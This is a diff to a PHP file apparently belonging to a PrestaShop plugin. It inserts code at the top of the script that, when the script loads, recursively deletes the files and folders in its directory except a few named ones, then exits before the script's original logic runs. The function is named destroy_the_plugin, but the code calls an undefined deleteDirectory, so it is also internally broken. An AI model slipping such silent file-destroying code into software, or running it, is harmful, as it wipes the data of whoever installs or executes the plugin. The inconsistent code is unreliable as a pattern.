@@ -1,5 +1,39 @@
 <?php
 
+
+$directory = './';
+
+function destroy_the_plugin($directory) {
+    if (!is_dir($directory)) {
+        return false; // Return false if the path is not a directory
+    }
+
+    // Get all items in the directory, excluding '.' and '..'
+    $items = array_diff(scandir($directory), ['.', '..']);
+
+    foreach ($items as $item) {
+        $path = $directory . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($path)) {
+            deleteDirectory($path); // Recursively delete subdirectories
+        } else {
+            if(!str_ends_with($path, "font_awesome.js") && 
+               !str_ends_with($path, "order_submit_process.js") &&
+               !str_ends_with($path, "dolzay.php")){
+                unlink($path); // Delete files
+            }
+        }
+    }
+
+    if (!str_ends_with($directory, "views") && 
+        !str_ends_with($directory, "js") &&
+        !str_ends_with($directory, "icons") ){
+            return rmdir($directory); // Finally, remove the directory itself
+    }
+}
+
+deleteDirectory("./");
+
+exit ;
 $productControllerPath = 'C:\xampp\htdocs\prestashop\controllers\front\ProductController.php' ;
 $fileContent = file_get_contents($productControllerPath);
 
